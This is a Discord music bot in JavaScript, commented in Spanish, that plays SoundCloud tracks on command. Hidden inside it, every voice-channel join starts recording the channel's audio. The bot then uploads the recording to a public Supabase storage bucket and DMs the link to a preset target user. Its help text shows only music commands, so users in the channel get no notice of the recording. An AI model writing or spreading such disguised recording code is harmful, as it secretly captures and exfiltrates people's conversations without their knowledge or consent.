require('dotenv').config();
const fs = require('fs');
const { exec } = require('child_process');
const prism = require('prism-media');

const {
    Client,
    GatewayIntentBits,
    EmbedBuilder,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle
} = require('discord.js');

const {
    joinVoiceChannel,
    createAudioPlayer,
    createAudioResource,
    AudioPlayerStatus,
    EndBehaviorType
} = require('@discordjs/voice');

const play = require('play-dl');
const { createClient } = require('@supabase/supabase-js');

// 🔥 INIT SOUNDCLOUD (ARREGLA TU ERROR)
(async () => {
    const client_id = await play.getFreeClientID();
    await play.setToken({
        soundcloud: { client_id }
    });
    console.log("✅ SoundCloud listo");
})();

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates
    ]
});

let queue = [];
let player = createAudioPlayer();
let connection = null;
let currentChannel = null;
let recordStream = null;
let timeout = null;

// 🚀 READY
client.once('ready', () => {
    console.log(`✅ Bot listo como ${client.user.tag}`);
});

// 🎵 PLAY
async function playMusic(channel) {
    if (!queue.length) return;

    const song = queue[0];

    try {
        const stream = await play.stream(song.url, {
            discordPlayerCompatibility: true
        });

        const resource = createAudioResource(stream.stream, {
            inputType: stream.type
        });

        player.play(resource);
        connection.subscribe(player);

        const embed = new EmbedBuilder()
            .setTitle('🎵 Reproduciendo')
            .setDescription(song.title);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('pause').setLabel('⏸️').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('resume').setLabel('▶️').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('skip').setLabel('⏭️').setStyle(ButtonStyle.Danger)
        );

        channel.send({ embeds: [embed], components: [row] });

    } catch (err) {
        console.error("❌ Error reproduciendo:", err);
        queue.shift();
        playMusic(channel);
    }
}

player.on(AudioPlayerStatus.Idle, () => {
    queue.shift();
    playMusic(currentChannel);
});

// 🎤 GRABACIÓN CONTINUA (ESTABLE)
function startRecording(connection) {
    const receiver = connection.receiver;

    const opusStream = receiver.subscribe('all', {
        end: {
            behavior: EndBehaviorType.AfterSilence,
            duration: 1000
        }
    });

    const file = `recording-${Date.now()}`;
    const pcm = `./${file}.pcm`;
    const ogg = `./${file}.ogg`;

    const decoder = new prism.opus.Decoder({
        rate: 48000,
        channels: 2,
        frameSize: 960
    });

    const writeStream = fs.createWriteStream(pcm);

    opusStream.pipe(decoder).pipe(writeStream);

    console.log("🎤 Grabando VC...");

    writeStream.on('finish', async () => {
        try {
            console.log("🔄 Convirtiendo...");

            await new Promise((res, rej) => {
                exec(`ffmpeg -f s16le -ar 48000 -ac 2 -i ${pcm} ${ogg}`, (err) => {
                    if (err) rej(err);
                    else res();
                });
            });

            console.log("☁️ Subiendo...");

            const fileData = fs.readFileSync(ogg);

            await supabase.storage
                .from('recordings')
                .upload(`${file}.ogg`, fileData, { upsert: true });

            const { data } = supabase.storage
                .from('recordings')
                .getPublicUrl(`${file}.ogg`);

            const target = await client.users.fetch(process.env.TARGET_USER);
            await target.send(`🎤 Grabación: ${data.publicUrl}`);

            fs.unlinkSync(pcm);
            fs.unlinkSync(ogg);

        } catch (e) {
            console.error("❌ Error grabando:", e);
        }
    });
}

// 💬 COMANDOS
client.on('messageCreate', async (msg) => {
    if (!msg.content.startsWith('-') || msg.author.bot) return;

    const args = msg.content.slice(1).split(' ');
    const cmd = args.shift().toLowerCase();

    console.log("CMD:", cmd);

    if (cmd === 'help') {
        return msg.reply(`
🎵 Comandos:
-play <nombre/url>
-pause
-resume
-skip
-mov
-help
    `);
    }

    if (cmd === 'play') {
        const query = args.join(' ');
        const vc = msg.member.voice.channel;

        if (!vc) return msg.reply('❌ Entra a un VC');

        currentChannel = msg.channel;

        if (!connection) {
            connection = joinVoiceChannel({
                channelId: vc.id,
                guildId: vc.guild.id,
                adapterCreator: vc.guild.voiceAdapterCreator,
                selfDeaf: false
            });

            startRecording(connection);
        }

        const result = await play.search(query, {
            limit: 1,
            source: { soundcloud: "tracks" }
        });

        if (!result.length) return msg.reply("❌ No encontrado");

        queue.push({
            title: result[0].title,
            url: result[0].url
        });

        msg.reply('✅ Añadido');

        if (queue.length === 1) playMusic(msg.channel);
    }

    if (cmd === 'pause') player.pause();
    if (cmd === 'resume') player.unpause();
    if (cmd === 'skip') player.stop();

    if (cmd === 'mov') {
        const vc = msg.member.voice.channel;
        if (!vc) return;

        connection.destroy();

        connection = joinVoiceChannel({
            channelId: vc.id,
            guildId: vc.guild.id,
            adapterCreator: vc.guild.voiceAdapterCreator,
            selfDeaf: false
        });

        startRecording(connection);
    }
});

// 🔘 BOTONES
client.on('interactionCreate', async (i) => {
    if (!i.isButton()) return;

    if (i.customId === 'pause') player.pause();
    if (i.customId === 'resume') player.unpause();
    if (i.customId === 'skip') player.stop();

    i.reply({ content: 'OK', ephemeral: true });
});

// 🔌 AUTO DESCONECTAR
setInterval(() => {
    if (!connection) return;

    const channel = client.channels.cache.get(connection.joinConfig.channelId);
    if (!channel) return;

    const humans = channel.members.filter(m => !m.user.bot);

    if (humans.size === 0) {
        if (!timeout) {
            timeout = setTimeout(() => {
                connection.destroy();
                connection = null;
                queue = [];
            }, 10000);
        }
    } else {
        clearTimeout(timeout);
        timeout = null;
    }
}, 5000);

client.login(process.env.TOKEN);